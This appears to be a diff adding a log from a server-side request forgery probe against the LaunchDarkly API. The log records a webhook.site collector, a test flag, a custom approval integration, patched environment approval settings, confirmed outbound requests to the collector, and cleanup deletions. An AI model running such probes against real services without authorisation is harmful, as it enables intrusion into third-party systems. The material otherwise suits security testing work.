@@ -1,0 +1,24 @@
+collector -> 201 uuid=15850554-f4a3-42a1-b8dd-5fd78a430543
+flag zeno-r21-ssrf -> 201 (new=True)
+CA ctrl create -> 201 id=8068635b-3d8a-4ec0-ab1e-0b9cbcaf16c9
+env approvalSettings snapshot: {"required": false, "bypassApprovalsForPendingChanges": false, "minNumApprovals": 1, "canReviewOwnRequest": false, "canApplyDeclinedChanges": true, "serviceKind": "launchdarkly", "serviceConfig": {}, "requiredApprovalTags": []}
+PATCH env (merge-min) -> 400 b'{"message":"Invalid json-patch document"}'
+PATCH env (merge-required) -> 400 b'{"message":"Invalid json-patch document"}'
+PATCH env (json-patch) -> 200 b'{"_links":{"analytics":{"href":"https://app.launchdarkly.com/snippet/events/v1/6ac28fd11c28fb07516cf364.js","type":"text/html"},"apiKey":{"href":"/api/v2/projec'
+BOUND=json-patch
+[ctrl] approval POST -> 400 id= serviceKind=None status=""
+    full: b'{"code":"invalid_request","message":"Unable to parse approval response:\\nThis URL has no default content configured. \\u003ca href=\\"https://webhook.site/#!/edit/15850554-f4a3-42a1-b8dd-5fd78a430543\\"\\u003eChange response in Webhook.site\\u003c/a\\u003e."}'
+[ctrl] collector hits total=1
+    hit: POST https://webhook.site/15850554-f4a3-42a1-b8dd-5fd78a430543/api/approvals ip=None
+[ctrl-nointeg] approval POST -> 400 id= serviceKind=None status=""
+    full: b'{"code":"invalid_request","message":"Unable to parse approval response:\\nThis URL has no default content configured. \\u003ca href=\\"https://webhook.site/#!/edit/15850554-f4a3-42a1-b8dd-5fd78a430543\\"\\u003eChange response in Webhook.site\\u003c/a\\u003e."}'
+[ctrl-nointeg] collector hits total=2
+    hit: POST https://webhook.site/15850554-f4a3-42a1-b8dd-5fd78a430543/api/approvals ip=None
+    hit: POST https://webhook.site/15850554-f4a3-42a1-b8dd-5fd78a430543/api/approvals ip=None
+
+=== CLEANUP ===
+env approvalSettings revert -> 400 b'{"message":"Invalid json-patch document"}'
+verify: {"required": false, "bypassApprovalsForPendingChanges": false, "minNumApprovals": 1, "canReviewOwnRequest": false, "canApplyDeclinedChanges": true, "autoApplyApprovedChanges": false, "serviceKind": "c
+config 8068635b-3d8a-4ec0-ab1e-0b9cbcaf16c9 DEL -> 204
+flag zeno-r21-ssrf DEL -> 204
+collector DEL -> 204
